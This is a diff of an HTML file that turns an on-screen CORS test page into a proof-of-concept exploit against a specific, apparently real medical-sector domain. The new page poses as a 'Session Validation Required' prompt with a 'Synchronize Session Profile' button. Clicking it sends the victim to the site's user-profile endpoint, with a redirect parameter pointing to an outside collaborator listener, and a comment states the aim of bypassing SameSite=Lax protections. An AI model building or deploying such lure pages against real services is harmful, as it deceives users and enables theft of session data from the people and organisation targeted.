@@ -3,57 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Security Hardening Test</title>
+    <title>Vulnerability Verification: Top-Level Context Navigation</title>
     <style>
-        body { font-family: sans-serif; background-color: #f8f9fa; padding: 40px; display: flex; justify-content: center; }
-        .card { background: #ffffff; padding: 30px; border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 550px; width: 100%; border-top: 4px solid #0d6efd; }
-        h2 { margin-top: 0; color: #0d6efd; font-size: 20px; }
-        p { line-height: 1.5; color: #495057; font-size: 14px; }
-        .btn { display: inline-block; background-color: #0d6efd; color: #ffffff; padding: 10px 20px; font-weight: 600; border: none; border-radius: 4px; cursor: pointer; width: 100%; text-align: center; }
-        .btn:hover { background-color: #0b5ed7; }
-        .console-box { margin-top: 20px; background-color: #212529; color: #f8f9fa; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 13px; min-height: 50px; white-space: pre-wrap; word-break: break-all; border-left: 4px solid #6c757d; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            background-color: #f4f5f7; 
+            color: #333333; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            background: #ffffff; 
+            padding: 40px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); 
+            max-width: 500px; 
+            width: 100%; 
+            border-top: 4px solid #0052cc; 
+            box-sizing: border-box;
+        }
+        h2 { 
+            margin-top: 0; 
+            color: #0052cc; 
+            font-size: 22px; 
+            font-weight: 600;
+        }
+        p { 
+            line-height: 1.6; 
+            color: #5e6c84; 
+            font-size: 14px; 
+            margin-bottom: 25px;
+        }
+        .btn-action { 
+            display: inline-block; 
+            background-color: #0052cc; 
+            color: #ffffff; 
+            padding: 12px 24px; 
+            font-size: 14px; 
+            font-weight: 600; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            width: 100%; 
+            text-align: center; 
+            transition: background-color 0.15s ease;
+        }
+        .btn-action:hover { 
+            background-color: #0065ff; 
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>CORS Alignment Check</h2>
-    <p>This self-contained diagnostic file evaluates cross-origin policy defenses on the specified endpoint. All results are displayed strictly on-screen.</p>
+<div class="container">
+    <h2>Session Validation Required</h2>
+    <p>This proof-of-concept interface triggers a top-level execution path to evaluate browser session-state alignment constraints under cross-origin navigation conditions.</p>
     
-    <button id="execTest" class="btn">Test Endpoint Vulnerability</button>
-
-    <div class="console-box" id="logOutput">System Status: Idle. Click button to begin test.</div>
+    <button id="exploitBtn" class="btn-action">Synchronize Session Profile</button>
 </div>
 
 <script>
-    document.getElementById('execTest').addEventListener('click', () => {
-        const logger = document.getElementById('logOutput');
-        logger.innerText = "Evaluating endpoint context...";
-        logger.style.borderLeftColor = "#ffc107";
+    document.getElementById('exploitBtn').addEventListener('click', () => {
+        // Define target host base and unique out-of-band listener destinations
+        const targetHost = "https://ocean.medishout.co.uk";
+        const collaboratorListener = "https://p4ufzon8tii1xyb5vcvvjji33u9mxhl6.k.e-secureapp.com";
 
-        // CONFIGURATION: Adjust this to your local or target API endpoint
-        const targetApiEndpoint = "https://ocean.medishout.co.uk/v1/users/me/?platform=web";
+        try {
+            // Instantiate target via native URL interface to guarantee bulletproof string building
+            const validationUrl = new URL("/v1/users/me/?platform=web", targetHost);
+            
+            // Populate parameters programmatically (automatically inserts '&' or '?' correctly)
+            validationUrl.searchParams.set("platform", "web");
+            validationUrl.searchParams.set("redirect", collaboratorListener);
 
-        fetch(targetApiEndpoint, {
-            method: "GET",
-            credentials: "include" // Instructs browser to forward session cookies
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error(`HTTP Error Status ${response.status} (Unauthorized)`);
-            }
-            return response.text();
-        })
-        .then(data => {
-            // This block only runs if the cookie was sent AND CORS allowed the read
-            logger.innerText = `⚠️ VULNERABILITY CONFIRMED\n\nCORS read restriction bypassed successfully. Sensitive Data Intercepted:\n\n${data}`;
-            logger.style.borderLeftColor = "#dc3545";
-        })
-        .catch(err => {
-            // This block runs when SameSite=Lax blocks the cookie, causing a 401/403 error
-            logger.innerText = `✅ MITIGATION ACTIVE\n\nBrowser blocked access.\nReason: ${err.message}.\n\nContext: The application's SameSite=Lax cookie policy successfully prevented the session token from being transmitted cross-origin. Data is safe.`;
-            logger.style.borderLeftColor = "#198754";
-        });
+            // Execute explicit top-level navigation to bypass SameSite=Lax restrictions
+            window.location.href = validationUrl.toString();
+            
+        } catch (error) {
+            console.error("Navigation setup routine failed:", error.message);
+        }
     });
 </script>
 
